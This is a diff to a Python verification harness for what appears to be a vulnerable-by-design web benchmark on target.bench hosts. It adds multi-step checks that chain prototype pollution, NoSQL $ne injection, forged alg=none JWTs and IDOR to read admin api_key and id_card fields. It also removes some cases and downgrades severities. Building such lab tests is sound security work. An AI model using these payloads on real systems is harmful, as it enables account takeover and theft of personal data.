@@ -380,15 +380,6 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
     # S4: modern_vulns — modern-app (www.target.bench)
     # ═══════════════════════════════════════════════════════════════
 
-    # M9: CORS wildcard — check response header
-    cases.append(VulnTestCase(
-        id="M9", name="CORS wildcard misconfiguration",
-        scenario_id="S4", scenario_name="modern_vulns",
-        method="GET", path="/", host="www.target.bench",
-        expected_flags=["Access-Control-Allow-Origin"],
-        severity="high",
-    ))
-
     # M1: JWT alg=none — bypass authentication
     jwt_none_token = _make_jwt(
         {"alg": "none", "typ": "JWT"},
@@ -415,7 +406,7 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         method="GET", path="/api/users/anyid", host="www.target.bench",
         headers={"Authorization": f"Bearer {jwt_bad_token}"},
         expected_flags=["Invalid token", "detail"],
-        severity="high",
+        severity="low",
     ))
 
     # M4: NoSQLi $ne operator
@@ -438,9 +429,12 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         severity="high",
     ))
 
-    # M6: Prototype pollution via constructor.prototype in Object.assign
+    # M6: Prototype pollution -> 越权读敏感数据 (多步, _run_test 特殊分支处理)
+    # step1: PUT /api/users/:id 传 constructor.prototype.isAdmin 污染 Object.prototype
+    # step2: GET /api/users?username[$ne]=x&debug=1 拿 admin 的 _id
+    # step3: GET /api/users/<admin_id>/sensitive (普通用户 token) -> 污染后 isAdmin===true 放行, 越权读 api_key/id_card
     cases.append(VulnTestCase(
-        id="M6", name="Prototype pollution via constructor.prototype",
+        id="M6", name="Prototype pollution -> privileged data read",
         scenario_id="S4", scenario_name="modern_vulns",
         method="PUT", path="/api/users/000000000000000000000001", host="www.target.bench",
         headers={
@@ -448,7 +442,19 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
             "Content-Type": "application/json",
         },
         body=json.dumps({"constructor": {"prototype": {"isAdmin": True}}}),
-        expected_flags=["prototype_polluted"],
+        expected_flags=["prototype_polluted", "api_key", "id_card"],
+        severity="high",
+    ))
+
+    # M_IDOR: /api/users/:id 无所有权检查, 任意有效 token 读任意用户完整文档 (多步, _run_test 特殊分支处理)
+    # step1: GET /api/users?username[$ne]=x&debug=1 拿 admin _id
+    # step2: GET /api/users/<admin_id> (普通用户 token) -> 返回 admin 完整文档含 api_key/id_card/password
+    cases.append(VulnTestCase(
+        id="M_IDOR", name="IDOR - any token reads any user full doc",
+        scenario_id="S4", scenario_name="modern_vulns",
+        method="GET", path="/api/users/_dynamic_", host="www.target.bench",
+        headers={"Authorization": f"Bearer {jwt_none_token}"},
+        expected_flags=["api_key", "id_card"],
         severity="high",
     ))
 
@@ -487,20 +493,6 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         severity="high",
     ))
 
-    # M11: Integer overflow / price manipulation
-    cases.append(VulnTestCase(
-        id="M11", name="Integer overflow / price manipulation",
-        scenario_id="S4", scenario_name="modern_vulns",
-        method="POST", path="/api/orders", host="www.target.bench",
-        headers={
-            "Authorization": f"Bearer {jwt_none_token}",
-            "Content-Type": "application/json",
-        },
-        body=json.dumps({"productId": "MacBook", "quantity": 1, "price": -99999}),
-        expected_flags=["total", "-99999"],  # total should be negative
-        severity="high",
-    ))
-
     # M12: Open redirect — don't follow redirects to verify 302
     cases.append(VulnTestCase(
         id="M12", name="Open redirect",
@@ -509,7 +501,7 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         expected_flags=[],  # verify via redirect status
         expected_status=302,
         follow_redirects=False,
-        severity="medium",
+        severity="low",
     ))
 
     # M13: GraphQL introspection
@@ -521,7 +513,7 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         headers={"Content-Type": "application/json"},
         body=introspection_query,
         expected_flags=["__schema"],
-        severity="medium",
+        severity="low",
     ))
 
     # M14: GraphQL updateUser mutation — mass assignment via input JSON
@@ -555,7 +547,7 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         method="GET", path="/api/users/not_a_valid_hex_id", host="www.target.bench",
         headers={"Authorization": f"Bearer {jwt_none_token}"},
         expected_flags=["error", "stack"],  # try/catch leaks stack in DEBUG mode
-        severity="high",
+        severity="low",
     ))
 
 
@@ -571,7 +563,7 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         headers={"Content-Type": "application/x-www-form-urlencoded"},
         body="username=admin&password=wrong",
         expected_flags=["sql_query", "secret_preview"],
-        severity="high",
+        severity="low",
     ))
 
     # HP_INTERNAL_PARAM: internal=true on /api/users
@@ -604,17 +596,6 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         severity="high",
     ))
 
-    # V11: XXE via XML parser
-    cases.append(VulnTestCase(
-        id="V11_XXE", name="XXE via XML bulk-delete",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="POST", path="/api/users/bulk-delete", host="admin.target.bench",
-        headers={"Content-Type": "application/xml"},
-        body='<?xml version="1.0"?><users><id>1</id></users>',
-        expected_flags=["xml_parser"],
-        severity="high",
-    ))
-
     # V12: Header backdoor
     cases.append(VulnTestCase(
         id="V12_HEADER", name="Header backdoor X-Internal-Request",
@@ -622,17 +603,6 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         method="GET", path="/api/internal/config", host="admin.target.bench",
         headers={"X-Internal-Request": "true"},
         expected_flags=["jwt", "database", "admin_token"],
-        severity="high",
-    ))
-
-    # V15_500LEAK: 500 error leak — verify debug mode is enabled
-    cases.append(VulnTestCase(
-        id="V15_500LEAK", name="DEBUG mode leaks error details",
-        scenario_id="S3", scenario_name="hidden_param_detection",
-        method="POST", path="/api/preferences", host="admin.target.bench",
-        headers={"Content-Type": "application/json"},
-        body=json.dumps({"__pickle_data": "invalid_base64!!!"}),
-        expected_flags=["error"],
         severity="high",
     ))
 
@@ -646,7 +616,7 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         scenario_id="S2", scenario_name="multi_entry_bypass",
         method="GET", path="/api/internal/health", host="api.target.bench",
         expected_flags=["INTERNAL_ENDPOINT_HEALTH"],
-        severity="critical",
+        severity="medium",
     ))
 
     # ME_SHOP_BYPASS: shop.target.bench bypass
@@ -677,7 +647,7 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         scenario_id="S6", scenario_name="bff_vulns",
         method="GET", path="/api/shop/user-profile", host="shop.target.bench",
         expected_flags=["BFF_aggregated", "username"],
-        severity="critical",
+        severity="medium",
     ))
 
     # B2: /sysadmin/ proxy without auth
@@ -686,7 +656,7 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         scenario_id="S6", scenario_name="bff_vulns",
         method="GET", path="/sysadmin/system/status", host="shop.target.bench",
         expected_flags=["status", "version"],
-        severity="critical",
+        severity="medium",
     ))
 
     # B6_COVERAGE: BFF proxy coverage (合并 B3+BFF_INTERNAL)
@@ -986,6 +956,10 @@ class VulnVerifier:
         if tc.method == "TCP":
             return self._run_tcp_test(tc)
 
+        # M6/M_IDOR: 多步测试 (动态获取 admin _id), 单独处理
+        if tc.id in ("M6", "M_IDOR"):
+            return self._run_multi_step_test(tc)
+
         effective_base = tc.alternate_url or self.base_url
         url = f"{effective_base}{tc.path}"
         headers = dict(tc.headers)
@@ -1026,18 +1000,6 @@ class VulnVerifier:
             else:
                 missing_flags.append(flag)
 
-        # For CORS test, check response headers
-        if tc.id == "M9":
-            cors_header = resp_headers.get("Access-Control-Allow-Origin", "")
-            if cors_header == "*":
-                if "Access-Control-Allow-Origin" not in matched_flags:
-                    matched_flags.append("Access-Control-Allow-Origin")
-                if "Access-Control-Allow-Origin" in missing_flags:
-                    missing_flags.remove("Access-Control-Allow-Origin")
-            else:
-                if "Access-Control-Allow-Origin" not in missing_flags:
-                    missing_flags.append("Access-Control-Allow-Origin")
-
         verified = len(missing_flags) == 0 and status_match and error is None
 
         # If error occurred but we still matched some flags, note it
@@ -1055,6 +1017,131 @@ class VulnVerifier:
             error=error,
             matched_flags=matched_flags,
             missing_flags=missing_flags,
+            severity=tc.severity,
+        )
+
+    def _run_multi_step_test(self, tc: VulnTestCase) -> VulnTestResult:
+        """M6 / M_IDOR 多步测试: 动态获取 admin _id 后验证越权读。
+
+        M6 (原型链污染 -> 越权读):
+          1. PUT /api/users/:id 传 constructor.prototype.isAdmin 污染 Object.prototype
+          2. GET /api/users?username[$ne]=x&debug=1 拿 admin 的 _id
+          3. GET /api/users/<admin_id>/sensitive (普通 token) -> 污染后 isAdmin===true 放行 -> 越权读 api_key/id_card
+        M_IDOR (任意 token 读任意人):
+          1. GET /api/users?username[$ne]=x&debug=1 拿 admin _id
+          2. GET /api/users/<admin_id> (普通 token) -> 返回 admin 完整文档含 api_key/id_card
+        """
+        host = "www.target.bench"
+        headers = dict(tc.headers)
+        headers.setdefault("Host", host)
+        body_bytes = tc.body.encode("utf-8") if tc.body else None
+
+        matched: list[str] = []
+        missing: list[str] = []
+        last_status: int | None = None
+        last_snippet = ""
+        error: str | None = None
+
+        # 构造一个 alg=none 的普通用户 token (模拟低权限调用者)
+        low_priv_token = _make_jwt(
+            {"alg": "none", "typ": "JWT"},
+            {"userId": "000000000000000000000099", "role": "user"},
+        )
+
+        def _req(method: str, path: str, hdrs: dict, body: bytes | None = None,
+                 follow: bool = True):
+            url = f"{self.base_url}{path}"
+            if follow:
+                return _http_request(method, url, hdrs, body, timeout=10)
+            return _http_request_no_redirect(method, url, hdrs, body, timeout=10)
+
+        if tc.id == "M6":
+            # step1: PUT 污染 (用 case 自带的 path/body/headers)
+            s1, b1, h1 = _req(tc.method, tc.path, headers, body_bytes)
+            last_status, last_snippet = s1, b1[:500]
+            error = h1.get("_error")
+            if "prototype_polluted" in b1:
+                matched.append("prototype_polluted")
+            else:
+                missing.append("prototype_polluted")
+
+            # step2: 拿 admin _id
+            s2, b2, h2 = _req("GET", "/api/users?username[$ne]=x&debug=1",
+                              {"Host": host, "Authorization": f"Bearer {low_priv_token}"})
+            admin_id = None
+            try:
+                import json as _json
+                data = _json.loads(b2)
+                users = data.get("users", data) if isinstance(data, dict) else data
+                if isinstance(users, list):
+                    for u in users:
+                        if isinstance(u, dict) and u.get("role") == "admin":
+                            admin_id = u.get("_id")
+                            break
+            except Exception:
+                pass
+
+            # step3: 越权读 sensitive (污染后 Object.prototype.isAdmin===true 放行)
+            if admin_id:
+                s3, b3, h3 = _req("GET", f"/api/users/{admin_id}/sensitive",
+                                  {"Host": host, "Authorization": f"Bearer {low_priv_token}"})
+                last_status, last_snippet = s3, b3[:500]
+                error = h3.get("_error") or error
+                if "api_key" in b3:
+                    matched.append("api_key")
+                else:
+                    missing.append("api_key")
+                if "id_card" in b3:
+                    matched.append("id_card")
+                else:
+                    missing.append("id_card")
+            else:
+                missing.extend(["api_key", "id_card"])
+
+        elif tc.id == "M_IDOR":
+            # step1: 拿 admin _id
+            s1, b1, h1 = _req("GET", "/api/users?username[$ne]=x&debug=1",
+                              {"Host": host, "Authorization": f"Bearer {low_priv_token}"})
+            error = h1.get("_error")
+            admin_id = None
+            try:
+                import json as _json
+                data = _json.loads(b1)
+                users = data.get("users", data) if isinstance(data, dict) else data
+                if isinstance(users, list):
+                    for u in users:
+                        if isinstance(u, dict) and u.get("role") == "admin":
+                            admin_id = u.get("_id")
+                            break
+            except Exception:
+                pass
+
+            # step2: IDOR 读 admin 完整文档
+            if admin_id:
+                s2, b2, h2 = _req("GET", f"/api/users/{admin_id}",
+                                  {"Host": host, "Authorization": f"Bearer {low_priv_token}"})
+                last_status, last_snippet = s2, b2[:500]
+                error = h2.get("_error") or error
+                if "api_key" in b2:
+                    matched.append("api_key")
+                else:
+                    missing.append("api_key")
+                if "id_card" in b2:
+                    matched.append("id_card")
+                else:
+                    missing.append("id_card")
+            else:
+                missing.extend(["api_key", "id_card"])
+
+        verified = len(missing) == 0 and error is None
+        return VulnTestResult(
+            test_id=tc.id, name=tc.name,
+            scenario_id=tc.scenario_id, scenario_name=tc.scenario_name,
+            verified=verified,
+            status_code=last_status,
+            response_snippet=last_snippet,
+            error=error,
+            matched_flags=matched, missing_flags=missing,
             severity=tc.severity,
         )
 
